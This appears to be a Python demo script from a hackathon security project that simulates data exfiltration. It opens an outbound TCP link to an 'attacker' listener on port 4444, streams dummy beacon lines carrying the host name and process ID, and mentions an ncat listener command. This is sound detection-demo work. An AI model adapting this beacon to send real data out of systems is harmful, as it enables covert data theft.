#!/usr/bin/env python3
"""
CyberShield Mesh — Harmless Outbound TCP Exfiltration Simulator (Python)

Demonstrates the Windows Security outbound traffic blind spot during the live
two-PC hackathon demo: opens a standard outbound TCP connection to the attacker
listener (default: 10.100.5.67:4444) and streams dummy beacon lines until
CyberShield Mesh detects, alerts, terminates this process, and blocks the IP.

Usage:
    python demo_attack/sim_intrusion.py
    python demo_attack/sim_intrusion.py --ip 10.100.5.67 --port 4444
"""

from __future__ import annotations

import argparse
import os
import platform
import socket
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    from dotenv import load_dotenv
except ImportError:
    load_dotenv = None


def load_default_target_ip() -> str:
    if load_dotenv is not None:
        env_path = Path(__file__).resolve().parent.parent / ".env"
        if env_path.exists():
            load_dotenv(env_path)
    return os.getenv("DEMO_TARGET_IP", "10.100.5.67").strip() or "10.100.5.67"


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Harmless outbound TCP beacon for CyberShield Mesh live demo."
    )
    parser.add_argument(
        "--ip",
        default=load_default_target_ip(),
        help="Remote listener IP address (default: DEMO_TARGET_IP or 10.100.5.67)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=4444,
        help="Remote listener TCP port (default: 4444)",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Seconds between dummy exfiltration beacons (default: 1.0)",
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=5,
        help="Connection retry attempts if listener is not yet ready (default: 5)",
    )
    return parser.parse_args()


def run_simulator(target_ip: str, target_port: int, interval: float, retries: int) -> int:
    pid = os.getpid()
    hostname = socket.gethostname()
    os_name = f"{platform.system()} {platform.release()}"

    print("=" * 68)
    print(" CyberShield Mesh — Live Demo Outbound Traffic Simulator (HARMLESS)")
    print("=" * 68)
    print(f" Local PID   : {pid}")
    print(f" Local Host  : {hostname} ({os_name})")
    print(f" Target Peer : {target_ip}:{target_port}")
    print(" Press Ctrl+C to stop manually (or wait for CyberShield Mesh kill).")
    print("-" * 68)

    sock: socket.socket | None = None
    for attempt in range(1, max(1, retries) + 1):
        try:
            print(f"[{attempt}/{retries}] Connecting to {target_ip}:{target_port} ...")
            sock = socket.create_connection((target_ip, target_port), timeout=5.0)
            sock.settimeout(5.0)
            local_ip, local_port = sock.getsockname()
            print(
                f"[CONNECTED] Established outbound TCP link "
                f"{local_ip}:{local_port} -> {target_ip}:{target_port}"
            )
            break
        except OSError as exc:
            print(f"[CONNECT FAILED] {exc}")
            if attempt < retries:
                time.sleep(1.5)
            else:
                print(
                    "\nCould not reach listener. On the Ubuntu attacker PC, verify:\n"
                    f"  ncat -lvnp {target_port}\n"
                    "And verify CyberShield Firewall rules are reset before retrying."
                )
                return 1

    assert sock is not None
    seq = 0
    try:
        while True:
            seq += 1
            ts = datetime.now(timezone.utc).strftime("%H:%M:%SZ")
            payload = (
                f"[{ts}] SIM_EXFIL seq={seq:04d} host={hostname} pid={pid} "
                f"chunk=DUMMY_CONFIDENTIAL_RECORD_{seq:04d}\n"
            )
            sock.sendall(payload.encode("utf-8"))
            print(f"[SENT #{seq:04d}] -> {target_ip}:{target_port} | {payload.strip()}")
            time.sleep(max(0.2, interval))
    except KeyboardInterrupt:
        print("\n[STOPPED] Simulator interrupted by user.")
        return 0
    except OSError as exc:
        print(f"\n[LINK SEVERED] Connection closed or blocked: {exc}")
        return 0
    finally:
        try:
            sock.close()
        except OSError:
            pass


if __name__ == "__main__":
    args = parse_args()
    sys.exit(run_simulator(args.ip, args.port, args.interval, args.retries))
